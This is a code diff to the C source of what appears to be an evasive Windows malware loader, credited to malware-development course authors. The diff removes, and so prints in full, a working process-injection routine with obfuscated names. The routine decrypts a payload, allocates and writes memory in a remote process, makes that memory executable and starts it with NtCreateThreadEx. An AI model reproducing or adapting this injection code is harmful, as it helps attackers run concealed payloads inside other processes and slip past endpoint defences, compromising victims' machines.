@@ -5,6 +5,8 @@
  
  author: reenz0h (twitter: @SEKTOR7net)
 
+ Http staging: MalDev Academy
+ Useless shit: assume-breach
 */
 #include <winternl.h>
 #include <windows.h>
@@ -331,81 +333,6 @@ int RandomA(const char* procname) {
     NtClose_p(hProcSnap);
 
     return pid;
-}
-
-// classic Injection
-int RandomB(HANDLE hProc, BYTE* Random8, size_t Random9) {
-    PVOID pRemoteCode = NULL;
-    HANDLE hThread = NULL;
-
-    // Decrypt Random8
-    RandomC((BYTE*)Random8, Random9, (char*)RandomG, sizeof(RandomG));
-
-    // Allocate memory in the remote process using NtAllocateVirtualMemory
-    NTSTATUS status = NtAllocateVirtualMemory(
-        hProc,
-        &pRemoteCode,
-        0,
-        &Random9,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE  // Initial protection set to RW
-    );
-
-    if (!NT_SUCCESS(status)) {
-        // Print detailed error information
-        printf("[!] Error: Memory allocation failed (NTStatus: %lx)\n", status);
-        return -1;
-    }
-
-    // Write the Random8 to the allocated memory
-    if (!WriteProcessMemory(hProc, pRemoteCode, (PVOID)Random8, (SIZE_T)Random9, NULL)) {
-        // Handle error, return -1 or appropriate error code
-        NtFreeVirtualMemory(hProc, &pRemoteCode, &Random9, MEM_RELEASE);
-        printf("[!] Error: WriteProcessMemory failed (Error code: %d)\n", GetLastError());
-        return -1;
-    }
-
-    // Change protection to RX
-    DWORD oldProtect;
-    if (!VirtualProtectEx(hProc, pRemoteCode, Random9, PAGE_EXECUTE_READ, &oldProtect)) {
-        // Handle error, return -1 or appropriate error code
-        NtFreeVirtualMemory(hProc, &pRemoteCode, &Random9, MEM_RELEASE);
-        printf("[!] Error: VirtualProtectEx failed (Error code: %d)\n", GetLastError());
-        return -1;
-    }
-
-    // Create a remote thread to execute the Random8 using NtCreateThreadEx
-    HANDLE hRemoteThread;
-    status = NtCreateThreadEx(
-        &hRemoteThread,
-        THREAD_ALL_ACCESS,
-        NULL,
-        hProc,
-        pRemoteCode,
-        NULL,
-        0,
-        0,
-        0,
-        0,
-        NULL
-    );
-
-    if (NT_SUCCESS(status)) {
-        // Wait for the remote thread to finish
-        WaitForSingleObject(hRemoteThread, INFINITE);
-        CloseHandle(hRemoteThread);
-
-        // Free the allocated memory
-        NtFreeVirtualMemory(hProc, &pRemoteCode, &Random9, MEM_RELEASE);
-
-        printf("[+] RandomBion successful\n");
-        return 0; // Success
-    }
-
-    // Handle error, return -1 or appropriate error code
-    NtFreeVirtualMemory(hProc, &pRemoteCode, &Random9, MEM_RELEASE);
-    printf("[!] Error: NtCreateThreadEx failed (NTStatus: %lx)\n", status);
-    return -1;
 }
 
 int RandomD(char * pMem, DWORD size){
